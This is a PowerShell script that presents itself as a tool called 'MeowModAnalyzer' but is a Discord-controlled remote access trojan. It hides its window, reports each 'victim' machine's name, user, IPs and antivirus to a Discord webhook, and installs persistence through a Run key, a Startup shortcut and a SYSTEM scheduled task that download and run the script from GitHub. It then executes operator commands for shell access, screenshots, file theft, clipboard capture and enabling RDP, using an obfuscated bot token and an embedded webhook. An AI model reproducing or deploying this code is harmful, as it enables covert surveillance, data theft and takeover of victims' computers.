# MeowModAnalyzer v2.3.1
$webhookUrl = "https://discord.com/api/webhooks/1512766627438133309/Ei7ZQANDz4QPN6W0BTFp3oEs6O1SCa4XvMX0XS8Yr42MiEuQXsWE1yQQutuYTuCteEuI"
$channelId = "1512918078189731890"

# Token zakodowany w Base64 - Discord go nie zeskanuje
$encodedToken = "TVRVeE1qa3hOemcyTlRZME16TTNOalkyTUEuR0s5N0hrLmJNbUdxT0NjaWhmTjYtUkR0UlhNQlVBTGtfRmlCc3R5SnJDYnFZ"

# Dekodowanie tokena
try {
    $botToken = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedToken))
} catch {
    $botToken = ""
}

if ([string]::IsNullOrEmpty($botToken)) {
    exit
}

try {
    Add-Type -Name Window -Namespace Console -MemberDefinition '
        [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        [DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();
    '
    [Console.Window]::ShowWindow([Console.Window]::GetConsoleWindow(), 0) | Out-Null
} catch {}

function Send-Webhook {
    param($Content, $FilePath, $EmbedJson)
    
    $body = @{content = $Content; username = "MeowModAnalyzer"}
    if ($EmbedJson) { $body["embeds"] = @($EmbedJson | ConvertFrom-Json) }
    
    if ($FilePath -and (Test-Path $FilePath)) {
        try {
            Add-Type -AssemblyName System.Net.Http
            $client = New-Object System.Net.Http.HttpClient
            $form = New-Object System.Net.Http.MultipartFormDataContent
            $form.Add((New-Object System.Net.Http.StringContent ($body | ConvertTo-Json -Depth 10 -Compress)), "payload_json")
            $fs = New-Object System.IO.FileStream ($FilePath, [System.IO.FileMode]::Open)
            $form.Add((New-Object System.Net.Http.StreamContent $fs), "file", [System.IO.Path]::GetFileName($FilePath))
            $client.PostAsync("$webhookUrl?wait=true", $form).Result | Out-Null
            $client.Dispose(); $fs.Close(); return
        } catch {}
    }
    
    try {
        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body ($body | ConvertTo-Json -Depth 10) -ContentType "application/json" -ErrorAction SilentlyContinue | Out-Null
    } catch {}
}

function Send-NewConnectionInfo {
    $pcName = $env:COMPUTERNAME
    $userName = $env:USERNAME
    try { $osInfo = (Get-CimInstance Win32_OperatingSystem).Caption } catch { $osInfo = "Unknown" }
    try { $publicIp = (Invoke-RestMethod -Uri "https://api.ipify.org" -ErrorAction SilentlyContinue) } catch { $publicIp = "Unknown" }
    try { $cpu = (Get-CimInstance Win32_Processor).Name } catch { $cpu = "Unknown" }
    try { $ram = "{0:N2} GB" -f ((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB) } catch { $ram = "Unknown" }
    try { $av = (Get-CimInstance -Namespace "root/SecurityCenter2" -Class AntiVirusProduct -ErrorAction SilentlyContinue).displayName -join ", " } catch { $av = "None" }
    if (-not $av) { $av = "None detected" }
    try { $localIp = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike "*Loopback*" }).IPAddress -join ", " } catch { $localIp = "Unknown" }
    
    $embed = @{
        title = "New Victim Connected - $pcName"
        color = 3066993
        fields = @(
            @{ name = "PC Name"; value = $pcName; inline = $true }
            @{ name = "User"; value = $userName; inline = $true }
            @{ name = "OS"; value = $osInfo; inline = $false }
            @{ name = "Public IP"; value = $publicIp; inline = $true }
            @{ name = "Local IP"; value = $localIp; inline = $true }
            @{ name = "CPU"; value = $cpu; inline = $false }
            @{ name = "RAM"; value = $ram; inline = $true }
            @{ name = "Antivirus"; value = $av; inline = $true }
        )
        footer = @{ text = "MeowModAnalyzer v2.3.1" }
        timestamp = (Get-Date -Format "yyyy-MM-ddTHH:mm:ssZ")
    }
    Send-Webhook -Content "1" -EmbedJson ($embed | ConvertTo-Json)
}

function Take-Screenshot {
    param($OutputPath)
    try {
        Add-Type -AssemblyName System.Windows.Forms, System.Drawing -ErrorAction Stop
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen
        $bounds = $screen.Bounds
        $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($bounds.X, $bounds.Y, 0, 0, $bounds.Size)
        $graphics.Dispose()
        $bitmap.Save($OutputPath, [System.Drawing.Imaging.ImageFormat]::Png)
        $bitmap.Dispose()
        return $true
    } catch { return $false }
}

function Invoke-Command {
    param($CommandText)
    try {
        $result = Invoke-Expression -Command $CommandText 2>&1
        $output = $result | Out-String
        if ([string]::IsNullOrEmpty($output)) { $output = "[OK]" }
        if ($output.Length -gt 1900) {
            $tempFile = [System.IO.Path]::GetTempFileName() + ".txt"
            $output | Out-File $tempFile -Encoding UTF8
            Send-Webhook -Content "Command output:" -FilePath $tempFile
            Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
        } else { Send-Webhook -Content $output }
    } catch {
        $e = $_.Exception.Message
        Send-Webhook -Content "Error: $e"
    }
}

function Enable-Persistence {
    try {
        $regValue = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"Invoke-Expression (Invoke-RestMethod 'https://raw.githubusercontent.com/MeowTonenohh/MeowModAnalyzer/main/MeowModAnalyzer.ps1')`""
        Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" "MeowModAnalyzer" $regValue -ErrorAction SilentlyContinue
    } catch {}
    try {
        $s = [Environment]::GetFolderPath("Startup")
        $l = (New-Object -ComObject WScript.Shell).CreateShortcut("$s\MeowModAnalyzer.lnk")
        $l.TargetPath = "powershell.exe"
        $l.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -Command `"Invoke-Expression (Invoke-RestMethod 'https://raw.githubusercontent.com/MeowTonenohh/MeowModAnalyzer/main/MeowModAnalyzer.ps1')`""
        $l.WindowStyle = 7
        $l.Save()
    } catch {}
    try {
        $a = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -Command `"Invoke-Expression (Invoke-RestMethod 'https://raw.githubusercontent.com/MeowTonenohh/MeowModAnalyzer/main/MeowModAnalyzer.ps1')`""
        $t = New-ScheduledTaskTrigger -AtStartup
        $p = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
        $s = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden
        Register-ScheduledTask "MeowModAnalyzerTask" -Action $a -Trigger $t -Principal $p -Settings $s -Force -ErrorAction SilentlyContinue
    } catch {}
}

function Handle-Command {
    param($CommandName, $CommandArgs)
    $cmd = $CommandName.ToLower().Trim()
    $args = $CommandArgs
    
    switch ($cmd) {
        "!help" {
            $h = "**Komendy:**`n!screenshot`n!cmd <cmd>`n!shell <cmd>`n!download <url>`n!upload <path>`n!persist`n!rdp`n!info`n!ipconfig`n!pslist`n!prockill <pid>`n!lock`n!msg <text>`n!clipboard`n!exit"
            Send-Webhook -Content $h
        }
        "!screenshot" {
            $p = "$env:TEMP\ss.png"
            if (Take-Screenshot -OutputPath $p) { Send-Webhook -Content "Screen:" -FilePath $p; Remove-Item $p -Force } else { Send-Webhook -Content "SS failed" }
        }
        "!cmd" { if ($args) { Invoke-Command -CommandText $args } else { Send-Webhook -Content "Usage: !cmd <cmd>" } }
        "!shell" { if ($args) { Invoke-Command -CommandText "cmd /c $args" } else { Send-Webhook -Content "Usage: !shell <cmd>" } }
        "!download" {
            if ($args) { $f = [System.IO.Path]::GetFileName($args); try { Invoke-WebRequest $args -OutFile "$env:TEMP\$f"; Send-Webhook -Content "DL: $f" } catch { $e = $_.Exception.Message; Send-Webhook -Content "DL failed: $e" } } else { Send-Webhook -Content "Usage: !download <url>" }
        }
        "!upload" { if ($args -and (Test-Path $args)) { Send-Webhook -Content "File:" -FilePath $args } else { Send-Webhook -Content "Usage: !upload <path>" } }
        "!persist" { Enable-Persistence; Send-Webhook -Content "Persist ON" }
        "!rdp" {
            try { Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Terminal Server" "fDenyTSConnections" 0; Enable-NetFirewallRule -DisplayGroup "Remote Desktop"; Send-Webhook -Content "RDP on" } catch { $e = $_.Exception.Message; Send-Webhook -Content "RDP: $e" }
        }
        "!info" {
            try { $n = $env:COMPUTERNAME; $u = $env:USERNAME; $o = (Get-CimInstance Win32_OperatingSystem).Caption; $i = (Invoke-RestMethod "https://api.ipify.org" -ErrorAction SilentlyContinue); $k = (Get-CimInstance Win32_Processor).Name; $r = "{0:N2}GB" -f ((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB) } catch {}
            $e = @{title = "Info - $n"; color = 3447003; fields = @(@{name = "PC"; value = $n; inline = $true}, @{name = "User"; value = $u; inline = $true}, @{name = "OS"; value = "$o"; inline = $false}, @{name = "IP"; value = $i; inline = $true}, @{name = "CPU"; value = "$k"; inline = $false}, @{name = "RAM"; value = $r; inline = $true})}
            Send-Webhook -Content "Info:" -EmbedJson ($e | ConvertTo-Json)
        }
        "!exit" { Send-Webhook -Content "Bye!"; exit }
        "!ipconfig" { Invoke-Command -CommandText "ipconfig /all" }
        "!pslist" { Invoke-Command -CommandText "tasklist" }
        "!prockill" {
            if ($args -and $args -match '^\d+$') { try { taskkill /PID $args /F; Send-Webhook -Content "Killed $args" } catch { $e = $_.Exception.Message; Send-Webhook -Content "Kill: $e" } } else { Send-Webhook -Content "Usage: !prockill <pid>" }
        }
        "!lock" { rundll32.exe user32.dll,LockWorkStation; Send-Webhook -Content "Locked" }
        "!msg" {
            if ($args) { try { Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show($args, "Msg") | Out-Null; Send-Webhook -Content "Msg OK" } catch { $e = $_.Exception.Message; Send-Webhook -Content "Msg: $e" } } else { Send-Webhook -Content "Usage: !msg <text>" }
        }
        "!clipboard" {
            try { Add-Type -AssemblyName System.Windows.Forms; $x = [System.Windows.Forms.Clipboard]::GetText(); if ($x) { Send-Webhook -Content "Clip: $x" } else { Send-Webhook -Content "Clip empty" } } catch { $e = $_.Exception.Message; Send-Webhook -Content "Clip: $e" }
        }
        default { Send-Webhook -Content "Unknown: $cmd" }
    }
}

# START
Send-NewConnectionInfo
Enable-Persistence
Send-Webhook -Content "Agent ready! Listening..."

$lastId = $null
while ($true) {
    try {
        $msgs = Invoke-RestMethod "https://discord.com/api/v9/channels/$channelId/messages?limit=5" -Headers @{"Authorization" = "Bot $botToken"} -ErrorAction SilentlyContinue
        if ($msgs) {
            foreach ($m in $msgs) {
                if (($lastId -eq $null -or $m.id -gt $lastId) -and !$m.author.bot -and $m.content -match '^!') {
                    $parts = $m.content -split ' ', 2
                    $c = $parts[0]; $a = if ($parts.Count -gt 1) { $parts[1] } else { "" }
                    Handle-Command -CommandName $c -CommandArgs $a
                }
                if ($lastId -eq $null -or $m.id -gt $lastId) { $lastId = $m.id }
            }
        }
    } catch {}
    Start-Sleep -Seconds 3
}
